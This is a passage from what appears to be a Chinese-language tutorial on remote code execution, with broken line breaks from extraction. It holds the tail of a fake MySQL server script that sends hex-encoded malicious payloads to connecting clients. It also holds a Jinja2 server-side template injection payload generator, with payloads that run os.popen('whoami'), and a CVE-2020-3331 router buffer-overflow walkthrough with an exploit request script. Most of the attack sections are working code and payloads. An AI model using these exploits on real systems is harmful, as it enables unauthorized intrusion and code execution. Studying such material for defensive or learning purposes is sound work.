44f5f4352454154455f555345522c4e4f5f454e47494e455f5355425354
49545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f5
2455045415441424c452d5245414405323838303007000016fe00000
2000000' 
                send_data(conn,_payload) 
                data=receive_data(conn) 
            elif "show warnings" in data: 
                _payload 
= 
'01000001031b00000203646566000000054c6576656c000c21001500
0000fd01001f00001a0000030364656600000004436f6465000c3f0004
00000003a1000000001d00000403646566000000074d657373616765
000c210000060000fd01001f000059000005075761726e696e6704313
238374b27404071756572795f63616368655f73697a65272069732064
65707265636174656420616e642077696c6c2062652072656d6f7665
6420696e2061206675747572652072656c656173652e590000060757
61726e696e6704313238374b27404071756572795f63616368655f747
9706527206973206465707265636174656420616e642077696c6c206
2652072656d6f76656420696e2061206675747572652072656c65617
3652e07000007fe000002000000' 
                send_data(conn, _payload) 
                data = receive_data(conn) 
            if "set names" in data: 
                send_data(conn, response_ok_data) 
                data = receive_data(conn) 
            if "set character_set_results" in data: 
                send_data(conn, response_ok_data) 
                data = receive_data(conn) 
            if "show session status" in data: 
                mysql_data = '0100000102' 
                mysql_data 
+= 
'1a000002036465660001630163016301630c3f00ffff0000fc90000000
00' 
                mysql_data 
+= 
'1a000003036465660001630163016301630c3f00ffff0000fc90000000
00' 
                # 为什么我加了 EOF Packet 就无法正常运行呢？？ 
                //获取 payload 
                payload_content=get_payload_content() 
                //计算 payload 长度 
                payload_length 
= 
str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) 
                payload_length_hex 
= 
payload_length[2:4] 
+ 
payload_length[0:2] 
                //计算数据包长度 
                data_len 
= 
str(hex(len(payload_content)//2 
+ 
4)).replace('0x', '').zfill(6) 
                data_len_hex = data_len[4:6] + data_len[2:4] + 
data_len[0:2] 
                mysql_data += data_len_hex + '04' + 'fbfc'+ 
payload_length_hex 
                mysql_data += str(payload_content) 
                mysql_data += '07000005fe000022000100' 
                send_data(conn, mysql_data) 
                data = receive_data(conn) 
            if "show warnings" in data: 
                payload 
= 
'01000001031b00000203646566000000054c6576656c000c21001500
0000fd01001f00001a0000030364656600000004436f6465000c3f0004
00000003a1000000001d00000403646566000000074d657373616765
000c210000060000fd01001f00006d000005044e6f746504313130356
25175657279202753484f572053455353494f4e205354415455532720
72657772697474656e20746f202773656c6563742069642c6f626a206
6726f6d2063657368692e6f626a732720627920612071756572792072
65777269746520706c7567696e07000006fe000002000000' 
                send_data(conn, payload) 
            break 
if __name__ == '__main__': 
    HOST ='0.0.0.0' 
    PORT = 3309 
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    #当 socket 关闭后，本地端用于该 socket 的端口号立刻就可以被
重用.为了实验的时候不用等待很长时间 
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    sk.bind((HOST, PORT)) 
    sk.listen(1) 
    print("start 
fake 
mysql 
server 
listening 
on 
{}:{}".format(HOST,PORT)) 
    run() 
SSTI 注入 
除了这些还有一种 rce 非常的少见，就是 ssti 注入到 rce 
简单 demo 
我们可以看到计算成功，那么就证明这个点是存在 ssti 注入的 
用网上的脚本跑一下 payload 
from flask import Flask 
from jinja2 import Template 
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', 
'__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', 
'__ge__', 
'__hash__', 
'__bool__', 
'__getattr__', 
'__getattribute__', 
'__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', 
'__call__', 
"__instancecheck__", 
'__subclasscheck__', 
'__len__', 
'__length_hint__', 
'__missing__','__getitem__', 
'__setitem__', 
'__iter__','__delitem__', 
'__reversed__', 
'__contains__', 
'__add__', 
'__sub__','__mul__'] 
neededFunction = ['eval', 'open', 'exec'] 
pay = int(input("Payload?[1|0]")) 
for index, i in enumerate({}.__class__.__base__.__subclasses__()): 
    for attr in searchList: 
        if hasattr(i, attr): 
            if eval('str(i.'+attr+')[1:9]') == 'function': 
                for goal in neededFunction: 
                    if 
(eval('"'+goal+'" 
in 
i.'+attr+'.__globals__["__builtins__"].keys()')): 
                        if pay != 1: 
                            print(i.__name__,":", attr, goal) 
                        else: 
                            print("{% 
for 
c 
in 
[].__class__.__base__.__subclasses__() 
%}{% 
if 
c.__name__=='" 
+ 
i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + 
"(\"[evil]\") }}{% endif %}{% endfor %}") 
我们从 output 里随便抽一个 payload 
例如第一行这个 
{% 
for 
c 
in 
[].__class__.__base__.__subclasses__() 
%}{% 
if 
c.__name__=='_ModuleLock' %}{{ c.__init__.__globals__['__builtins__'].e
val("print('ZACTEST')") }}{% endif %}{% endfor %} 
然后打开我们的 web 服务，就是最开始的 demo 
打进去 payload，我们可以看到成功 print 输出 ZACTEST 
使用 os 模块执行 whoami 
http://127.0.0.1:5000/?name={% 
for 
c 
in 
[].__class__.__base__.__subclasses__() 
%}{% 
if 
c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].
eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %} 
缓存区溢出 RCE 
因为我并不是玩 pwn 的，所以对缓冲区溢出 RCE 几乎完全不懂，以
下就直接把大佬文章搬过来（已经得到授权）原文链接出处： 
https://ret2w1cky.com/2021/11/12/RV110W-%E6%BC%8F%E6%B4%9E%
E5%A4%8D%E7%8E%B0/ 
假设我们已经通过类似固件解包，串口通信等方法获取了路由器的固
件等我们可以尝试通过寻找已知的 CVE 来定位可能的 rce,这里是寻
找到了 CVE-2020-3331 这个漏洞。 
由于并没有对于漏洞点的一个精确定位 我们现在要一点一点的摸索；
首先 在上面的Nmap 扫描中 我们知道网站是开放了443端口的 因
此 上内部服务器之后 netstat 确定文件是最好的方式了 但是 因为
某一些原因 其中的 netstst 命令可能因为版本过低没有办法使用一些
参数 所以 我决定开个 http 服务器 把高等级的 busybox 传上去 
可以看到 443 端口绑定的正是 httpd 文件 现在我们已经可以确定漏
洞文件了 现在只需要查找漏洞的函数了 
这时候 我们就可以使用diff查找也就是查找两个文件不同的地方 我
们使用 Bindiff 工具, 现在 我们解包新版本的 和旧版本进行比对： 
这里 可以说越红就代表差异越大 但是 你越往下看就会发现唯一这
个 guest_logout_cgi 和 web 有点关系 右键这个函数 View flow graph 
嗯  随 便 一 看 就可以 看 到 这 里有 个高 风 险 函 数 `sscanf` 地 址 在
`0x431ba8` 
其中 sscanf 的条件"%[^;];%*[^=]=%[^\n]"里，% 表示选择，%* 表示过
滤，中括号括起来的是类似正则 
%[^;]：分号前的所有字符都要 
%*[^=]：分号后，等号前的字符都不要 
%[^\n]：等号后，换行符前的所有字符都要 
也就是说，如果输入字符串”aaa;bbb=ccc”，会将 aaa 和 ccc 写入对应
变量，并没有限制长度，会导致栈溢出 
找到了这段代码 我们现在要对伪代码进行分析 看看需要达到那些
分支才能达到`sscanf 函数` 
通过查阅函数 可以知道我们需要让... 
⚫ cmac：mac 格式 
⚫ cip： ip 格式 
⚫ submit_button: 包含 status_guestnet.asp 
现在知道了页面是`/guest_logout.cgi`了 需要达成这些条件 那么 我
们就可以开始试图溢出了 exp 如下 ： 
import requests 
url = "https://192.168.1.1/guest_logout.cgi" 
payload 
= 
{"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+'a'
*100,"cip":"192.168.1.100"} 
其中 我们还需要确定是用 get 还是 post 进行攻击 具体还是自己试
一试吧 最后会发现只有 post 攻击下 web 后台会转圈圈 所以可以确